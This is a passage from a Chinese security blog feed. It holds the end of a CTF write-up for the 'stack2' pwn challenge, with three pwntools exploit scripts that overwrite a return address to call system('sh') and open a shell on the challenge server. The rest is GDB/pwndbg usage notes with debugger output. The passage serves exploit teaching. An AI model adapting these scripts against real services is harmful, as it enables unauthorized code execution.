class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>) </span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0XAF</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X85</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这个题有个坑点在于题目给出了<code>getshell</code>的函数，但是出题人在搭建<strong>docker</strong>环境时未注意，环境中只给了<code>sh</code>，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到<code>getshell</code>，需要简单的<strong>ROP</strong>一下，我们只需要找到<code>system</code>函数的调用地址和<code>bin/sh</code>的字符串地址即可</p><p>最终的Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">system_addr=<span class="number">0x080485AF</span></span><br><span class="line">leave_offset=<span class="number">0x84</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span><span class="params">(addr,va)</span>:</span></span><br><span class="line">io.sendline(<span class="string">"3"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">io.sendline(str(addr))</span><br><span class="line">io.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">io.sendline(str(va))</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">io=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'31725'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"1"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"><span class="comment"># write  system_addr  0x08048450</span></span><br><span class="line">write_addr(leave_offset,<span class="number">0X50</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X84</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line"><span class="comment"># sh_addr  0x08048987</span></span><br><span class="line">leave_offset+=<span class="number">8</span></span><br><span class="line"><span class="keyword">print</span> leave_offset</span><br><span class="line">write_addr(leave_offset,<span class="number">0x87</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">1</span>,<span class="number">0X89</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">2</span>,<span class="number">0X04</span>)</span><br><span class="line">write_addr(leave_offset+<span class="number">3</span>,<span class="number">0X08</span>)</span><br><span class="line">io.sendline(<span class="string">"5"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">sh = process(<span class="string">'./stack2'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">sh = remote(<span class="string">"47.96.239.28"</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(off, val)</span>:</span></span><br><span class="line">sh.send(<span class="string">"3\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">sh.send(str(off) + <span class="string">"\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">sh.send(str(val) + <span class="string">"\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_dword</span><span class="params">(off, val)</span>:</span></span><br><span class="line">write_byte(off, val &amp; <span class="number">0xff</span>)</span><br><span class="line">write_byte(off + <span class="number">1</span>, (val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">write_byte(off + <span class="number">2</span>, (val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">write_byte(off + <span class="number">3</span>, (val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">sh.send(<span class="string">"5\n"</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line">write_dword(<span class="number">0x84</span>, <span class="number">0x8048450</span>)</span><br><span class="line">write_dword(<span class="number">0x8C</span>, <span class="number">0x8048980</span> + <span class="number">7</span>)</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GDB笔记</title>
      <link href="/2019/09/04/GDB%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/"/>
      <url>/2019/09/04/GDB%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><h3 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h3><p>查看程序地址布局</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x55af2b74c000</span>     <span class="number">0x55af2b74d000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2b94d000</span>     <span class="number">0x55af2b94e000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2b94e000</span>     <span class="number">0x55af2b94f000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game</span><br><span class="line">    <span class="number">0x55af2bfe7000</span>     <span class="number">0x55af2c008000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7eff0e064000</span>     <span class="number">0x7eff0e224000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e224000</span>     <span class="number">0x7eff0e424000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e424000</span>     <span class="number">0x7eff0e428000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e428000</span>     <span class="number">0x7eff0e42a000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e42a000</span>     <span class="number">0x7eff0e42e000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7eff0e42e000</span>     <span class="number">0x7eff0e454000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e635000</span>     <span class="number">0x7eff0e638000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7eff0e653000</span>     <span class="number">0x7eff0e654000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e654000</span>     <span class="number">0x7eff0e655000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7eff0e655000</span>     <span class="number">0x7eff0e656000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7fffcce94000</span>     <span class="number">0x7fffcceb5000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7fffccef0000</span>     <span class="number">0x7fffccef3000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7fffccef3000</span>     <span class="number">0x7fffccef5000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><h3 id="telescope"><a href="#telescope" class="headerlink" title="telescope"></a>telescope</h3><p>telescope [addr]  [count]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fffcceb26e8</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffcceb2728</span> —▸ <span class="number">0x55af2b74c8f0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffcceb2730</span> ◂— <span class="number">0x5d6df5a3</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│      <span class="number">0x7fffcceb2738</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│ rbp  <span class="number">0x7fffcceb2740</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│      <span class="number">0x7fffcceb2748</span> —▸ <span class="number">0x7eff0e084830</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│      <span class="number">0x7fffcceb2750</span> ◂— <span class="number">0x1</span></span><br><span class="line">0e:0070│      0x7fffcceb2758 —▸ 0x7fffcceb2828 —▸ 0x7fffcceb4208 ◂— 'dice_game'</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│      <span class="number">0x7fffcceb2760</span> ◂— <span class="number">0x10e653ca0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│      <span class="number">0x7fffcceb2768</span> —▸ <span class="number">0x55af2b74cb99</span> ◂— push   rbp</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│      <span class="number">0x7fffcceb2770</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│      <span class="number">0x7fffcceb2778</span> ◂— <span class="number">0x8904a58936d20a67</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│      <span class="number">0x7fffcceb2780</span> —▸ <span class="number">0x55af2b74c8f0</span> ◂— xor    ebp, ebp</span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│      <span class="number">0x7fffcceb2788</span> —▸ <span class="number">0x7fffcceb2820</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│      <span class="number">0x7fffcceb2790</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│      <span class="number">0x7fffcceb27a0</span> ◂— <span class="number">0xdda56ab6e1d20a67</span></span><br><span class="line"><span class="number">18</span>:<span class="number">00</span>c0│      <span class="number">0x7fffcceb27a8</span> ◂— <span class="number">0xdfa4ef7020a20a67</span></span><br><span class="line"><span class="number">19</span>:<span class="number">00</span>c8│      <span class="number">0x7fffcceb27b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line">1c:00e0│      0x7fffcceb27c8 —▸ 0x7fffcceb2838 —▸ 0x7fffcceb4212 ◂— 0x505f4150515f5451 ('QT_QPA_P')</span><br><span class="line"><span class="number">1</span>d:<span class="number">00e8</span>│      <span class="number">0x7fffcceb27d0</span> —▸ <span class="number">0x7eff0e655168</span> —▸ <span class="number">0x55af2b74c000</span> ◂— jg     <span class="number">0x55af2b74c047</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7fffcceb26e8</span> </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffcceb26e8</span> —▸ <span class="number">0x55af2b74cbfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffcceb26f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffcceb2720</span> —▸ <span class="number">0x55af2b74ccd0</span> ◂— push   r15</span><br></pre></td></tr></table></figure><h3 id="x"><a href="#x" class="headerlink" title="x"></a>x</h3><p>格式：x/&lt;n/f/u&gt;  <addr></addr></p><p>n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p><p>f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p><p>x 按十六进制格式显示变量。</p><p>d 按十进制格式显示变量。</p><p>u 按十六进制格式显示无符号整型。</p><p>o 按八进制格式显示变量。</p><p>t 按二进制格式显示变量。</p><p>a 按十六进制格式显示变量。</p><p>c 按字符格式显示变量。</p><p>f 按浮点数格式显示变量。</p><p>u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes</p><p>示例:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>wx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:<span class="number">0x2b74cbfc</span><span class="number">0x000055af</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x7fffcceb2708</span>:<span class="number">0x00000000</span><span class="number">0x00000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:<span class="number">0x000055af2b74cbfc</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb2708</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffcceb2718</span>:<span class="number">0x0000000000000000</span><span class="number">0x000055af2b74ccd0</span></span><br><span class="line"><span class="number">0x7fffcceb2728</span>:<span class="number">0x000055af2b74c8f0</span><span class="number">0x000000005d6df5a3</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10b</span>x <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:<span class="number">0xfc</span><span class="number">0xcb</span><span class="number">0x74</span><span class="number">0x2b</span><span class="number">0xaf</span><span class="number">0x55</span><span class="number">0x00</span><span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffcceb26f0</span>:<span class="number">0x00</span><span class="number">0x00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>hx <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:<span class="number">0xcbfc</span><span class="number">0x2b74</span><span class="number">0x55af</span><span class="number">0x0000</span><span class="number">0x0000</span><span class="number">0x0000</span><span class="number">0x0000</span><span class="number">0x0000</span></span><br><span class="line"><span class="number">0x7fffcceb26f8</span>:<span class="number">0x0000</span><span class="number">0x0000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10b</span> <span class="number">0x7fffcceb26e8</span></span><br><span class="line"><span class="number">0x7fffcceb26e8</span>:<span class="number">0xfc</span><span class="number">0xcb</span><span class="number">0x74</span><span class="number">0x2b</span><span class="number">0xaf</span><span class="number">0x55</span><span class="number">0x00</span><span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffcceb26f0</span>:<span class="number">0x00</span><span class="number">0x00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>c <span class="number">0x7fffcceb26e8</span></span><br><span class="line">0x7fffcceb26e8:-4 '\374'-53 '\313'116 't'43 '+'-81 '\257'85 'U'0 '\000'0 '\000'</span><br><span class="line">0x7fffcceb26f0:0 '\000'0 '\000'</span><br></pre></td></tr></table></figure><h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><p>显示堆的情况</p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>显示堆的分配情况</p><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>stack [count]<br>显示栈的情况</p><h2 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h2><h3 id="b"><a href="#b" class="headerlink" title="b"></a>b</h3><p>直接输入b会把断点下在当前rip或者eip的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">RIP  <span class="number">0x7ffff7b04260</span> (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">───────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff7b04260</span> &lt;__read_nocancel+<span class="number">7</span>&gt;     cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">   <span class="number">0x7ffff7b04266</span> &lt;__read_nocancel+<span class="number">13</span>&gt;    jae    read+<span class="number">73</span> &lt;<span class="number">0x7ffff7b04299</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b04299</span> &lt;read+<span class="number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="number">0x2ccbd8</span>]</span><br><span class="line">   <span class="number">0x7ffff7b042a0</span> &lt;read+<span class="number">80</span>&gt;               neg    eax</span><br><span class="line">   <span class="number">0x7ffff7b042a2</span> &lt;read+<span class="number">82</span>&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   <span class="number">0x7ffff7b042a5</span> &lt;read+<span class="number">85</span>&gt;               <span class="keyword">or</span>     rax, <span class="number">0xffffffffffffffff</span></span><br><span class="line">   <span class="number">0x7ffff7b042a9</span> &lt;read+<span class="number">89</span>&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff7b042aa</span>                         nop    word ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7ffff7b042b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="number">0x2d2489</span>], <span class="number">0</span> &lt;<span class="number">0x7ffff7dd6740</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7b042b7</span> &lt;write+<span class="number">7</span>&gt;               jne    write+<span class="number">25</span> &lt;<span class="number">0x7ffff7b042c9</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b042c9</span> &lt;write+<span class="number">25</span>&gt;              sub    rsp, <span class="number">8</span></span><br><span class="line">────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdce8</span> —▸ <span class="number">0x555555554bfc</span> ◂— mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rsi  <span class="number">0x7fffffffdcf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x555555554cd0</span> ◂— push   r15</span><br><span class="line">──────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff7b04260 __read_nocancel+<span class="number">7</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">555555554b</span>fc</span><br><span class="line">   f <span class="number">2</span>     <span class="number">7f</span>fff7a2d830 __libc_start_main+<span class="number">240</span></span><br><span class="line">Program received signal SIGINT</span><br><span class="line">pwndbg&gt; b</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x7ffff7b04260</span>: file ../sysdeps/unix/syscall-<span class="keyword">template</span>.S, line <span class="number">84.</span></span><br></pre></td></tr></table></figure><p>b  *addr</p><p>下断点在addr处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *<span class="number">0x7ffff7b042a9</span></span><br><span class="line">Breakpoint <span class="number">4</span> at <span class="number">0x7ffff7b042a9</span>: file ../sysdeps/unix/syscall-<span class="keyword">template</span>.S, line <span class="number">86.</span></span><br></pre></td></tr></table></figure><p>b *reg</p><p>根据寄存器的值下断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *$r12</span><br><span class="line">Breakpoint <span class="number">5</span> at <span class="number">0x5555555548f0</span></span><br></pre></td></tr></table></figure><p>下完断点后 c（continue）命令，程序会在你下的断点处断下来，但是前提是你要保证程序会执行到那里</p><h3 id="rwatch"><a href="#rwatch" class="headerlink" title="rwatch"></a>rwatch</h3><p>内存访问断点</p><p>rwatch *addr</p><figure class="highlight c"><table><tr><td 